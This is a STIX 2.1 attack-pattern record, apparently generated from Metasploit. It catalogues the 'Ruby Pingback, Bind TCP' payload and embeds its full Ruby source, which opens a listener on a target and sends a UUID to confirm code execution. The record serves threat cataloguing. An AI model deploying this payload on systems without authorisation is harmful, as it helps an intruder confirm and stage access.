{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5a585d47-35d8-425d-b2e6-71b7c2b4f98d",
    "created": "2024-08-14T16:33:19.28488Z",
    "modified": "2024-08-14T16:33:19.284883Z",
    "name": "Ruby Pingback, Bind TCP",
    "description": "Listens for a connection from the attacker, sends a UUID, then terminates",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/ruby/pingback_bind_tcp.rb",
            "external_id": "pingback_bind_tcp.rb"
        }
    ],
    "x_code_snippet": "\nmodule MetasploitModule\n\n  CachedSize = 103\n\n  include Msf::Payload::Single\n  include Msf::Payload::Ruby\n  include Msf::Payload::Pingback\n  include Msf::Payload::Pingback::Options\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name' => 'Ruby Pingback, Bind TCP',\n      'Description' => 'Listens for a connection from the attacker, sends a UUID, then terminates',\n      'Author' => 'asoto-r7',\n      'License' => MSF_LICENSE,\n      'Platform' => 'ruby',\n      'Arch' => ARCH_RUBY,\n      'Handler' => Msf::Handler::BindTcp,\n      'Session' => Msf::Sessions::Pingback,\n      'PayloadType' => 'ruby'\n    ))\n  end\n\n  def generate(_opts = {})\n    #return prepends(ruby_string)\n    return ruby_string\n  end\n\n  def ruby_string\n    self.pingback_uuid ||= self.generate_pingback_uuid\n    return \"require'socket';\" \\\n      \"s=TCPServer.new(#{datastore['LPORT'].to_i});\"\\\n      \"c=s.accept;\"\\\n      \"s.close;\"\\\n      \"c.puts'#{[[self.pingback_uuid].pack('H*')].pack('m0')}\\'.unpack('m0');\"\n      \"c.close\"\n  end\nend\n\n\n",
    "x_mitre_platforms": [
        "ruby'"
    ]
}